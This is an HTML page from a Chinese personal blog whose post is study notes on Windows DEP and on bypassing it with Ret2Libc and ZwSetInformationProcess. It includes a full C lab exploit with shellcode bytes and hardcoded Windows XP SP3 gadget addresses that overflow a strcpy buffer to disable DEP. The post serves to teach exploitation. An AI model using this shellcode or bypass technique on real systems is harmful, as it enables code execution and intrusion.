@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="chinese">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="0day安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="DEP,全称是Data Excution Protection,中名叫数据执行保护，是XP+sp2,Win2K03+sp1中加入的对内存的一种保护，用来防止恶意程序对系统的攻击。">
+<meta name="keywords" content="0day安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DEP学习">
+<meta property="og:url" content="http://yoursite.com/2019/12/13/DEP学习/index.html">
+<meta property="og:site_name" content="loser的博客">
+<meta property="og:description" content="DEP,全称是Data Excution Protection,中名叫数据执行保护，是XP+sp2,Win2K03+sp1中加入的对内存的一种保护，用来防止恶意程序对系统的攻击。">
+<meta property="og:locale" content="chinese">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/13/DEP学习/13.png">
+<meta property="og:updated_time" content="2019-12-17T14:35:14.031Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DEP学习">
+<meta name="twitter:description" content="DEP,全称是Data Excution Protection,中名叫数据执行保护，是XP+sp2,Win2K03+sp1中加入的对内存的一种保护，用来防止恶意程序对系统的攻击。">
+<meta name="twitter:image" content="http://yoursite.com/2019/12/13/DEP学习/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/13/DEP学习/">
+
+
+
+
+
+  <title>DEP学习 | loser的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="chinese">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">loser的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/13/DEP学习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="loser">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="loser的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DEP学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-13T16:05:18+08:00">
+                2019-12-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>DEP,全称是Data Excution Protection,中名叫数据执行保护，是XP+sp2,Win2K03+sp1中加入的对内存的一种保护，用来防止恶意程序对系统的攻击。<br><a id="more"></a></p>
+<h1 id="保护原理"><a href="#保护原理" class="headerlink" title="保护原理"></a>保护原理</h1><p>DEP 的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode 时，程序会尝试在数据页面上执行指令，此时CPU 就会抛出异常，而不是去执行恶意指令。</p>
+<p>DEP 的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。根据实现的机制不同可分为：软件DEP（Software DEP）和硬件DEP（Hardware-enforced DEP）</p>
+<p>软件DEP 其实就是我们前面介绍的SafeSEH，它的目的是阻止利用S.E.H 的攻击，这种机制与CPU 硬件无关，Windows 利用软件模拟实现DEP，对操作系统提供一定的保护。</p>
+<p>硬件DEP 才是真正意义的DEP，硬件DEP 需要CPU 的支持，AMD 和Intel 都为此做了设计，AMD 称之为No-Execute Page-Protection (NX)，Intel 称之为Execute Disable Bit (XD)。</p>
+<p>操作系统通过设置内存页的NX/XD 属性标记，来指明不能从该内存执行代码。为了实现这个功能，需要在内存的页面表（Page Table）中加入一个特殊的标识位（NX/XD）来标识是否允许在该页上执行指令。当该标识位设置为0 里表示这个页面允许执行指令，设置为1 时表示该页面不允许执行指令。</p>
+<p>一个和DEP 密切相关的程序链接选项：/NXCOMPAT。/NXCOMPAT 是Visual Studio 2005 及后续版本中引入一个链接选项，默认情况下是开启的</p>
+<p><img src="1.png" alt=""><br>采用/NXCOMPAT 编译的程序会在文件的PE 头中设置IMAGE_DLLCHARACTERISTICS_NX_COMPAT 标识，该标识通过结构体IMAGE_OPTIONAL_HEADER 中的DllCharacteristics变量进行体现，当DllCharacteristics 设置为0x0100 表示该程序采用了/NXCOMPAT 编译</p>
+<p>DEP 针对溢出攻击的本源，完善了内存管理机制。通过将内存页设置为不可执行状态，来阻止堆栈中shellcode 的执行。</p>
+<p>DEP的自身限制：<br>首先，硬件DEP 需要CPU 的支持，但并不是所有的CPU 都提供了硬件DEP 的支持，在一些比较老的CPU 上边DEP 是无法发挥作用的。</p>
+<p>其次，由于兼容性的原因Windows 不能对所有进程开启DEP 保护，否则可能会出现异常。例如一些第三方的插件DLL，由于无法确认其是否支持DEP，对涉及这些DLL 的程序不敢贸然开启DEP 保护。再有就是使用ATL 7.1 或者以前版本的程序需要在数据页面上产生可以执行代码，这种情况就不能开启DEP 保护，否则程序会出现异常。</p>
+<p>再次，/NXCOMPAT 编译选项，或者是IMAGE_DLLCHARACTERISTICS_NX_COMPAT的设置，只对Windows Vista 以上的系统有效。在以前的系统上，如Windows XP SP3 等，这个设置会被忽略。也就是说，即使采用了该链接选项的程序在一些操作系统上也不会自动启用DEP 保护。</p>
+<p>最后，当DEP 工作在最主要的两种状态Optin 和Optout 下时，DEP 是可以被动态关闭和开启的，这就说明操作系统提供了某些API 函数来控制DEP 的状态。同样很不幸的是早期的操作系统中对这些API 函数的调用没有任何限制，所有的进程都可以调用这些API 函数，这就埋下了很大的安全隐患，也为我们突破DEP 提供了一条道路。</p>
+<h1 id="攻击未启用DEP的程序"><a href="#攻击未启用DEP的程序" class="headerlink" title="攻击未启用DEP的程序"></a>攻击未启用DEP的程序</h1><p>电脑不能对所以程序都开启DEP，当加载的耨个进程中的加载模块有模块不支持DEP，则这个进程就不能开启DEP，所以就可以选择攻击未启用DEP保护的程序。</p>
+<h1 id="利用Ret2Libc挑战DEP"><a href="#利用Ret2Libc挑战DEP" class="headerlink" title="利用Ret2Libc挑战DEP"></a>利用Ret2Libc挑战DEP</h1><p>DEP 保护下溢出失败的根本原因是DEP，检测到程序转到非可执行页执行指令了，已经存在的系统函数必然存在于可执行页上，所以此时DEP 是不会拦截的，Ret2libc攻击的原理也正是基于此的</p>
+<p>Ret2libc 是Return-to-libc 简写，由于DEP 不允许我们直接到非可执行页执行指令，我们就需要在其他可执行的位置找到符合我们要求的指令，让这条指令来替我们工作，为了能够控制程序流程，在这条指令执行后，我们还需要一个返回指令，以便收回程序的控制权，然后继续下一步操作</p>
+<p><img src="2.png" alt=""><br>简言之，只要为shellcode 中的每条指令都在代码区找到一条替代指令，就可以完成exploit想要的功能了。理论上说，这种方法是可行的，但是实际上操作难度极大。姑且不说是不是shellcode 中的每条指令都能在代码区找到替代指令，就算所有替代指令都找好了，如何保证每条指令的地址都不包含0x00 截断字符呢？栈帧如何去布置呢？我们不断使用替代指令执行操作，然后通过 retn 指令收回控制权，不停地跳来跳去，稍有不慎就跳沟里去了。</p>
+<p>为此，有三种方法解决：<br>（1）通过跳转到ZwSetInformationProcess 函数将DEP 关闭后再转入shellcode 执行。</p>
+<p>（2）通过跳转到VirtualProtect 函数来将shellcode 所在内存页设置为可执行状态，然后再转入shellcode 执行。</p>
+<p>（3）通过跳转到VIrtualAlloc 函数开辟一段具有执行权限的内存空间，然后将shellcode 复制到这段内存中执行。</p>
+<h2 id="利用ZwSetInformationProcess函数突破DEP"><a href="#利用ZwSetInformationProcess函数突破DEP" class="headerlink" title="利用ZwSetInformationProcess函数突破DEP"></a>利用ZwSetInformationProcess函数突破DEP</h2><p>一个进程的DEP 设置标识保存在KPROCESS 结构中的_KEXECUTE_OPTIONS 上，而这个标识可以通过API 函数ZwQueryInformationProcess 和 ZwSetInformationProcess 进行查询和修改。</p>
+<p>_KEXECUTE_OPTIONS 的结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_KEXECUTE_OPTIONS</span><br><span class="line">Pos0:ExecuteDisable :1bit</span><br><span class="line">Pos1:ExecuteEnable :1bit</span><br><span class="line">Pos2:DisableThunkEmulation :1bit</span><br><span class="line">Pos3:Permanent :1bit</span><br><span class="line">Pos4:ExecuteDispatchEnable :1bit</span><br><span class="line">Pos5:ImageDispatchEnable :1bit</span><br><span class="line">Pos6:Spare :2bit</span><br></pre></td></tr></table></figure></p>
+<p>这些标识位中前4 个bit 与DEP 相关，当前进程DEP 开启时ExecuteDisable 位被置1，当进程DEP 关闭时ExecuteEnable 位被置1，DisableThunkEmulation 是为了兼容ATL 程序设置的，Permanent 被置1 后表示这些标志都不能再被修改。真正影响DEP 状态是前两位，所以我们只要将_KEXECUTE_OPTIONS 的值设置为0x02（二进制为00000010）就可以将ExecuteEnable置为1。</p>
+<p>NtSetInformationProcess函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ZwSetInformationProcess(</span><br><span class="line">IN HANDLE ProcessHandle,</span><br><span class="line">IN PROCESS_INFORMATION_CLASS ProcessInformationClass,</span><br><span class="line">IN PVOID ProcessInformation,</span><br><span class="line">IN ULONG ProcessInformationLength );</span><br></pre></td></tr></table></figure></p>
+<p>第一个参数为进程的句柄，设置为−1的时候表示为当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS，第四个参数为第三个参数的长度。Skape 和Skywing 在他们的论文Bypassing Windows Hardware-Enforced DEP 中给出了关闭DEP 的参数设置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;</span><br><span class="line">ZwSetInformationProcess(</span><br><span class="line">NtCurrentProcess(), // (HANDLE)-1</span><br><span class="line">ProcessExecuteFlags, // 0x22</span><br><span class="line">&amp;ExecuteFlags, // ptr to 0x2</span><br><span class="line">sizeof(ExecuteFlags)); // 0x4</span><br></pre></td></tr></table></figure>
+<p>所以我们只要构造一个的合乎要求的栈帧，然后调用这个函数就可以为进程关闭DEP了.函数包含着0x00的截断字符，这会造成字符串复制的时候被截断，所以我们得寻找一处关闭DEP的进程调用，然后利用它来构造参数来关闭DEP。</p>
+<p>由于要考虑兼容性的问题，当一个进程的Permanent 位没有设置，当它加载DLL时，系统就会对这个DLL 进行DEP 兼容性检查，当存在兼容性问题时进程的DEP 就会被关闭。为此设立了LdrpCheckNXCompatibility 函数，当符合以下条件之一时进程的DEP 会被关闭：</p>
+<p>（1）当DLL 受SafeDisc 版权保护系统保护时；<br>（2）当DLL 包含有.aspcak、.pcle、.sforce 等字节时；<br>（3）Windows Vista 下面当DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”键下边标识出不需要启动DEP 的模块时。</p>
+<p>如果我们能模拟其中一种情况，那么DEP就会被关闭，我们先来模仿第一种情况，Windows XP SP3 下LdrpCheckNXCompatibility 关：闭DEP 的具体流程，以SafeDisc 为例：</p>
+<p><img src="3.png" alt=""><br>接下来寻找程序中未启用DEP的程序<br><img src="4.png" alt=""><br>由于只有CMP AL，1 成立的情况下程序才能继续执行，所以我们需要一个指令将AL 修改为1。将AL 修改为1 后我们让程序转到0x7C93CD24 执行，在执行0x7C93CD6F 处的RETN4 时DEP 已经关闭，此时如果我们可以在让程序在RETN 到一个我们精心构造的指令地址上，就有可能转入shellcode 中执行了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// GS_Virtual.cpp : 定义控制台应用程序的入口点。</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">char shellcode[]=</span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x52\xE2\x92\x7C&quot;//MOV EAX,1 RETN地址</span><br><span class="line">&quot;\x85\x8B\x1D\x5D&quot;//修正EBP</span><br><span class="line">&quot;\x19\x4A\x97\x7C&quot;//增大ESP</span><br><span class="line">&quot;\xB4\xC1\xC5\x7D&quot;//jmp esp</span><br><span class="line">&quot;\x24\xCD\x93\x7C&quot;//关闭DEP代码的起始位置</span><br><span class="line">&quot;\xE9\x33\xFF\xFF&quot;//回跳指令</span><br><span class="line">&quot;\xFF\x90\x90\x90&quot;</span><br><span class="line">;</span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">	char tt[176];</span><br><span class="line">	strcpy(tt,shellcode);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;);</span><br><span class="line">	char temp[200];</span><br><span class="line">	test();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对实验思路和代码简要解释如下:<br>（1）为了更直观地反映绕过DEP 的过程，我们在本次实验中不启用GS 和SafeSEH。<br>（2）函数test 存在一个典型的溢出，通过向str 复制超长字符串造成str 溢出，进而覆盖函数返回地址。<br>（3）将函数的返回地址覆盖为类似MOV AL,1 retn 的指令，在将AL 置1 后转入0x7C93CD24关闭DEP。<br>（4）DEP 关闭后shellcode 就可以正常执行了。<br>为了避免strcpy时shellcode被截断，我们需要选择一个不包含0x00的地址，使用0x7C92E252 覆盖函数的返回地址。数组一共176个字节，4个字节的ebp地址，接下来写返回地址0x7C92E252。</p>
+<p>main()函数返回地址已经被修改:<br><img src="6.png" alt=""><br>跳转到mov ax,1，然后rent地址被修改 将EBP指向一个可写的位置 只能寻找到一个PUSH ESP POP EBP的位置<br><img src="7.png" alt=""><br>接下来增大ESP的值 由于关闭DEP后无法返回 所以需要对ESP进行调整<br><img src="8.png" alt=""><br>然后跳转到ESP<br><img src="9.png" alt=""><br>跳到关闭DEP代码的位置<br><img src="10.png" alt=""><br>关闭DEP的代码<br><img src="11.png" alt=""><br>然后执行回跳指令<br><img src="12.png" alt=""><br>程序回归正常执行 弹出熟悉的弹框<br><img src="13.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/0day安全/" rel="tag"># 0day安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/08/safeSEH的理解/" rel="next" title="SafeSEH的理解">
+                <i class="fa fa-chevron-left"></i> SafeSEH的理解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2049/11/30/C-学习笔记/" rel="prev" title="C++学习笔记">
+                C++学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">loser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">55</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#保护原理"><span class="nav-number">1.</span> <span class="nav-text">保护原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#攻击未启用DEP的程序"><span class="nav-number">2.</span> <span class="nav-text">攻击未启用DEP的程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用Ret2Libc挑战DEP"><span class="nav-number">3.</span> <span class="nav-text">利用Ret2Libc挑战DEP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用ZwSetInformationProcess函数突破DEP"><span class="nav-number">3.1.</span> <span class="nav-text">利用ZwSetInformationProcess函数突破DEP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">loser</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
